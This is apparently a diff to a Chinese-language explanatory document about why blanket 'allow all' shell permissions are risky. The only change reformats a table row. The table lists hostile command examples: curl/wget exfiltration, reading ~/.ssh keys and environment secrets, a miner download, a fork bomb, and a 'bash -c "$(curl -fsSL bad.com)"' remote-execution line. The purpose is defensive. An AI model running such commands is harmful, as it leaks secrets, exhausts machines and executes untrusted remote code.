@@ -33,7 +33,7 @@ Answer:
 | Network / exfil | `curl`, potential `wget`, `ping` etc. | 是 — 可以将本地文件/token/keys 发送到攻击者控制的服务器 |
 | Environment leakage | `env`, `printenv`, `cat ~/.ssh/*` (如果密钥存在) | 是 — 可以泄露存在于 shell env 或 home 目录（如果可读）中的 secrets |
 | Cryptocurrency miners | `git clone ... && ./miner` | 是 — 可以在不接触其他文件夹的情况消耗你的 CPU/GPU |
-| Infinite loops / fork bombs | `while true; do :; done` 或 `:(){ :|:& };: ` | 是 — 可以使你的机器死机/崩溃 |
+| Infinite loops / fork bombs | `while true; do :; done` 或 `:(){ : | :& };: ` | 是 — 可以使你的机器死机/崩溃 |
 | Obfuscated install | `bash -c "$(curl -fsSL bad.com)"` | 是 — 在项目目录运行但会下载并执行任何内容 |
 
 - **为什么 Git repo 并不能让 "allow all" 变得安全**
